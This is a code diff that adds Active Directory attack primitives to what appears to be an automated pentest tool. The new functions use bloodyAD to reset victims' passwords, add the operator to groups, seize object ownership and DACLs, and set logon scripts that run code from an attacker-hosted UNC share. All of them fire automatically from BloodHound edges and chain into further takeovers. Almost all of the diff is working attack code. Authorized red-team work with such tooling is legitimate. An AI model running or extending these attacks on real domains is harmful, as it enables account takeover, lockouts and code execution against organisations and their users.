@@ -44,6 +44,7 @@ import json
 import logging
 import os
 import re
+import secrets
 import shutil
 import signal
 import subprocess
@@ -61,7 +62,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.12.0"
+VERSION = "4.13.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 KRBRELAYX_DIR = TOOLS_DIR / "krbrelayx"
@@ -6762,6 +6763,196 @@ def run_rbcd_attack(target: str, cfg: Config) -> bool:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# ACL / ACE abuse primitives (bloodyAD-driven)
+#
+# Weaponize the actionable-ACE edges that analyze_bloodhound_data() already
+# surfaces — ForceChangePassword, WriteOwner/Owns, WriteDacl, and
+# GenericAll/GenericWrite over users and groups. Each is a thin, dry-run-safe
+# wrapper over a single bloodyAD write and is auto-fired by _bh_auto_action().
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _random_password(length: int = 16) -> str:
+    """Complexity-safe random password for ForceChangePassword resets."""
+    # No ambiguous chars (0/O/1/l/I); prefix guarantees upper+lower+digit+symbol.
+    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789"
+    body = "".join(secrets.choice(alphabet) for _ in range(length))
+    return "Aa1!" + body
+
+
+def _bloody_ok(result, output: str) -> bool:
+    """bloodyAD exits 0 and is quiet on a successful write. Treat rc==0 with no
+    obvious error text as success. --dry-run returns rc==0 (run() short-circuits),
+    which is exactly what we want — the write is reported but never sent."""
+    if result.returncode != 0:
+        return False
+    low = output.lower()
+    return not any(w in low for w in
+                   ("error", "traceback", "denied", "failed", "not have", "insufficient"))
+
+
+def _record_reset_cred(cfg: Config, account: str, password: str) -> None:
+    """Persist a password set via ForceChangePassword — the original is not
+    recoverable, so the operator needs the new one (and to notify the owner)."""
+    f = cfg.work_dir / "reset-creds.txt"
+    with f.open("a") as fh:
+        fh.write(f"{cfg.domain}\\{account}:{password}\n")
+    detail(f"New credential written to {f}")
+
+
+def run_force_change_password(target: str, cfg: Config, new_password: str = "") -> bool:
+    """ForceChangePassword / AllExtendedRights → reset a principal's password
+    (bloodyAD 'set password'). Destructive: the original password is not
+    recoverable and the owner is locked out until IT resets it. Recorded to
+    reset-creds.txt."""
+    phase_header(f"FORCE CHANGE PASSWORD ({target})")
+    if not cfg.has_creds:
+        log.error("ForceChangePassword requires domain credentials")
+        return False
+    if not tool_exists("bloodyAD"):
+        log.error("bloodyAD not found — cannot reset password (pipx install bloodyAD)")
+        return False
+
+    new_password = new_password or _random_password()
+    out_file = cfg.work_dir / f"forcechpw-{target.rstrip('$')}.txt"
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + ["set", "password", target, new_password]
+    result = run(cmd, cfg, timeout=60, outfile=out_file)
+    output = (result.stdout or "") + (out_file.read_text(errors="replace") if out_file.exists() else "")
+
+    if _bloody_ok(result, output):
+        success_box(f"Password reset on '{target}'")
+        detail(f"{cfg.domain}\\{target} : {new_password}")
+        _record_reset_cred(cfg, target, new_password)
+        detail(f"Auth: nxc smb {cfg.dc_ip} -u '{target}' -p '{new_password}'")
+        return True
+    log.warning(f"ForceChangePassword failed on {target}: {_first_line(output)}")
+    return False
+
+
+def run_add_member(group: str, member: str, cfg: Config) -> bool:
+    """GenericAll/GenericWrite/AddMember on a group → add `member` (default:
+    our own account) to it (bloodyAD 'add groupMember'). Reversible — the
+    removal command is printed for cleanup."""
+    member = member or cfg.username
+    phase_header(f"ADD GROUP MEMBER ({member} -> {group})")
+    if not cfg.has_creds:
+        log.error("Add-member requires domain credentials")
+        return False
+    if not tool_exists("bloodyAD"):
+        log.error("bloodyAD not found — cannot modify group membership")
+        return False
+
+    out_file = cfg.work_dir / ("addmember-" + group.replace(" ", "_") + ".txt")
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + ["add", "groupMember", group, member]
+    result = run(cmd, cfg, timeout=60, outfile=out_file)
+    output = (result.stdout or "") + (out_file.read_text(errors="replace") if out_file.exists() else "")
+
+    if _bloody_ok(result, output):
+        success_box(f"'{member}' added to '{group}'")
+        if not cfg.no_cleanup:
+            detail(f"Cleanup: bloodyAD {' '.join(_bloody_auth_args(cfg))} "
+                   f"remove groupMember '{group}' '{member}'")
+        detail("Re-auth to refresh your Kerberos TGT and pick up the new membership.")
+        return True
+    log.warning(f"Add-member failed ({member} -> {group}): {_first_line(output)}")
+    return False
+
+
+def run_write_dacl(target: str, cfg: Config) -> bool:
+    """WriteDacl → grant our own account GenericAll over the target
+    (bloodyAD 'add genericAll'), leaving us in full control of the object."""
+    phase_header(f"WRITE DACL -> GenericAll ({target})")
+    if not cfg.has_creds or not tool_exists("bloodyAD"):
+        log.error("WriteDacl abuse requires creds + bloodyAD")
+        return False
+
+    out_file = cfg.work_dir / f"writedacl-{target.rstrip('$')}.txt"
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + ["add", "genericAll", target, cfg.username]
+    result = run(cmd, cfg, timeout=60, outfile=out_file)
+    output = (result.stdout or "") + (out_file.read_text(errors="replace") if out_file.exists() else "")
+
+    if _bloody_ok(result, output):
+        ok(f"GenericAll granted to '{cfg.username}' over '{target}'")
+        if not cfg.no_cleanup:
+            detail(f"Cleanup: bloodyAD {' '.join(_bloody_auth_args(cfg))} "
+                   f"remove genericAll '{target}' '{cfg.username}'")
+        return True
+    log.warning(f"WriteDacl abuse failed on {target}: {_first_line(output)}")
+    return False
+
+
+def run_write_owner(target: str, cfg: Config) -> bool:
+    """WriteOwner/Owns → take ownership (bloodyAD 'set owner'), then grant
+    ourselves GenericAll. Ownership implies WriteDacl, so this escalates to
+    full control of the object."""
+    phase_header(f"WRITE OWNER -> full control ({target})")
+    if not cfg.has_creds or not tool_exists("bloodyAD"):
+        log.error("WriteOwner abuse requires creds + bloodyAD")
+        return False
+
+    out_file = cfg.work_dir / f"writeowner-{target.rstrip('$')}.txt"
+    owner_cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + ["set", "owner", target, cfg.username]
+    result = run(owner_cmd, cfg, timeout=60, outfile=out_file)
+    output = (result.stdout or "") + (out_file.read_text(errors="replace") if out_file.exists() else "")
+    if not _bloody_ok(result, output):
+        log.warning(f"Set-owner failed on {target}: {_first_line(output)}")
+        return False
+    ok(f"Ownership of '{target}' taken by '{cfg.username}'")
+    # Ownership → WriteDacl → grant ourselves GenericAll for a usable primitive.
+    return run_write_dacl(target, cfg)
+
+
+def run_write_logon_script(target: str, cfg: Config, script_path: str = "") -> bool:
+    """GenericWrite/GenericAll on a user → set scriptPath (logon script) via
+    bloodyAD 'set object'. Code runs in the user's context at their next
+    interactive logon. Fallback when shadow credentials / PKINIT is
+    unavailable. The clear command is printed for cleanup."""
+    phase_header(f"WRITE LOGON SCRIPT ({target})")
+    if not cfg.has_creds or not tool_exists("bloodyAD"):
+        log.error("Logon-script write requires creds + bloodyAD")
+        return False
+
+    script_path = script_path or f"\\\\{cfg.attacker_ip or 'ATTACKER'}\\share\\update.bat"
+    out_file = cfg.work_dir / f"logonscript-{target}.txt"
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + \
+        ["set", "object", target, "scriptPath", "-v", script_path]
+    result = run(cmd, cfg, timeout=60, outfile=out_file)
+    output = (result.stdout or "") + (out_file.read_text(errors="replace") if out_file.exists() else "")
+
+    if _bloody_ok(result, output):
+        success_box(f"Logon script set on '{target}' -> {script_path}")
+        detail("Runs at the target's next interactive logon (host a .bat on the UNC path).")
+        if not cfg.no_cleanup:
+            detail(f"Cleanup: bloodyAD {' '.join(_bloody_auth_args(cfg))} "
+                   f"set object '{target}' scriptPath   # empty value clears it")
+        return True
+    log.warning(f"Logon-script write failed on {target}: {_first_line(output)}")
+    return False
+
+
+def _takeover_user(target: str, cfg: Config) -> bool:
+    """Given full control of a user object, obtain a usable credential:
+    shadow credentials → PKINIT NT hash (best), else fall back to a logon
+    script for user-context code execution."""
+    if run_shadow_credentials(target, cfg):
+        return True
+    detail("Shadow credentials unavailable/failed — falling back to logon-script write")
+    return run_write_logon_script(target, cfg)
+
+
+def _weaponize_control(target: str, target_type: str, cfg: Config) -> bool:
+    """After gaining full control of an object (via WriteOwner/WriteDacl),
+    chain to the right primitive for its type."""
+    if target_type == "Computer":
+        return run_rbcd_attack(target, cfg)
+    if target_type == "User":
+        return _takeover_user(target, cfg)
+    if target_type == "Group":
+        return run_add_member(target, cfg.username, cfg)
+    detail(f"Full control of {target_type}:{target} — no automatic follow-on; weaponize manually")
+    return False
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # Dollar Ticket — KDC's automatic $-suffix retry on principal lookup
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -7816,10 +8007,15 @@ def _bh_auto_action(edges: list[dict], cfg: Config):
     """Fire opportunistic attack chains for each actionable BloodHound edge.
 
     Maps edge (right, target_type) → primitive:
-      WriteSPN              → try_ghost_spn_upgrade   (CVE-2025-58726-style)
-      AddKeyCredentialLink  → run_shadow_credentials  (PKINIT pre-auth)
-      ReadGMSAPassword      → run_gmsa_read           (managed password → NT)
-      GenericAll/Write* on Computer → run_rbcd_attack (RBCD impersonation)
+      WriteSPN                 → try_ghost_spn_upgrade  (CVE-2025-58726-style)
+      AddKeyCredentialLink     → run_shadow_credentials (PKINIT pre-auth)
+      ReadGMSAPassword         → run_gmsa_read          (managed password → NT)
+      GenericAll/Write* Computer → run_rbcd_attack      (RBCD impersonation)
+      ForceChangePassword/AllExtendedRights User → run_force_change_password
+      GenericAll/Write User    → shadow creds, else logon-script (_takeover_user)
+      GenericAll/Write Group   → run_add_member         (add self)
+      WriteOwner/Owns          → run_write_owner  → full control → chain by type
+      WriteDacl                → run_write_dacl   → full control → chain by type
 
     De-duplicates by (action, target) so the same target isn't hit twice.
     Caps total auto-actions to avoid runaway chains."""
@@ -7856,6 +8052,18 @@ def _bh_auto_action(edges: list[dict], cfg: Config):
                 run_gmsa_read(sam, cfg)
             elif action == "rbcd":
                 run_rbcd_attack(sam, cfg)
+            elif action == "force_change_pw":
+                run_force_change_password(sam, cfg)
+            elif action == "add_member":
+                run_add_member(sam, cfg.username, cfg)
+            elif action == "user_takeover":
+                _takeover_user(sam, cfg)
+            elif action == "write_owner":
+                if run_write_owner(sam, cfg):
+                    _weaponize_control(sam, e["target_type"], cfg)
+            elif action == "write_dacl":
+                if run_write_dacl(sam, cfg):
+                    _weaponize_control(sam, e["target_type"], cfg)
         except Exception as ex:
             log.warning(f"Auto-action {action} on {sam} crashed: {ex}")
 
@@ -8426,6 +8634,22 @@ _BH_AUTO_ACTION_MAP: dict[tuple[str, str], str] = {
     ("GenericWrite",               "Computer"): "rbcd",
     ("WriteAccountRestrictions",   "Computer"): "rbcd",
     ("AddAllowedToAct",            "Computer"): "rbcd",
+    # ACL/ACE weaponization (v4.13.0) — detected edges → executed takeovers
+    ("ForceChangePassword",        "User"):     "force_change_pw",
+    ("AllExtendedRights",          "User"):     "force_change_pw",
+    ("GenericAll",                 "User"):     "user_takeover",
+    ("GenericWrite",               "User"):     "user_takeover",
+    ("GenericAll",                 "Group"):    "add_member",
+    ("GenericWrite",               "Group"):    "add_member",
+    ("WriteOwner",                 "User"):     "write_owner",
+    ("WriteOwner",                 "Computer"): "write_owner",
+    ("WriteOwner",                 "Group"):    "write_owner",
+    ("Owns",                       "User"):     "write_owner",
+    ("Owns",                       "Computer"): "write_owner",
+    ("Owns",                       "Group"):    "write_owner",
+    ("WriteDacl",                  "User"):     "write_dacl",
+    ("WriteDacl",                  "Computer"): "write_dacl",
+    ("WriteDacl",                  "Group"):    "write_dacl",
 }
 
 
